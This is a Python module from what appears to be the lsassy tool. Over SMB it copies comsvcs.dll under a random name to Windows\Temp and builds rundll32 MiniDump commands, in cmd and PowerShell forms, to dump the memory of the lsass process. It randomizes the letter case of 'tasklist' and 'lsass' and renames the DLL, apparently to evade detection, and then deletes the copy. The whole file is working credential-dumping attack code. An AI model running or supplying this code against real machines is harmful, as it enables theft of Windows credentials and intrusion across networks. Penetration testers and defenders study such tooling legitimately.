from lsassy.dumpmethod import IDumpMethod
from lsassy.impacketfile import ImpacketFile
import logging
import random
import string


class CustomBuffer():
    def __init__(self):
        self._buffer = b""
        self._currentOffset = 0
        self._total_read = 0

    def read(self, size):
        if self._currentOffset >= len(self._buffer):
            return b""
        self._currentOffset += size
        buff = self._buffer[self._currentOffset - size: min(self._currentOffset, len(self._buffer))]
        self._currentOffset  = min(self._currentOffset, len(self._buffer))
        return buff

    def write(self, stream):
        self._buffer += stream


class DumpMethod(IDumpMethod):

    need_debug_privilege = True

    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.comsvcs_copied = False
        self.comsvcs_copy_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
        self.comsvcs_copy_path = "\\Windows\\Temp\\"
        logging.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))

    def random_case(self, s):
        return ''.join(c.upper() if random.getrandbits(1) == 1 else c.lower() for c in s)

    def get_commands(self):
        tasklist = self.random_case("tasklist")
        lsass = self.random_case("lsass")
        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #24 ^%B {}{} full""".format(
            tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
        )
        pwsh_command = """rundll32.exe C:{}{} `#24 (Get-Process {}).Id {}{} full""".format(
             self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }

    def prepare(self, options):
        try:
            logging.info("Opening comsvcs.dll")
            buff = CustomBuffer()
            self._session.smb_session.getFile("C$", "\\Windows\\System32\\comsvcs.dll", buff.write)
            self._session.smb_session.putFile("C$", self.comsvcs_copy_path + self.comsvcs_copy_name, buff.read)
            logging.success("Comsvcs.dll successfuly copied")
            self.comsvcs_copied = True
            return True
        except Exception as e:
            print(e)
            return None

    def clean(self):
        if self.comsvcs_copied:
            ImpacketFile.delete(self._session, self.comsvcs_copy_path + self.comsvcs_copy_name, timeout=self._timeout)
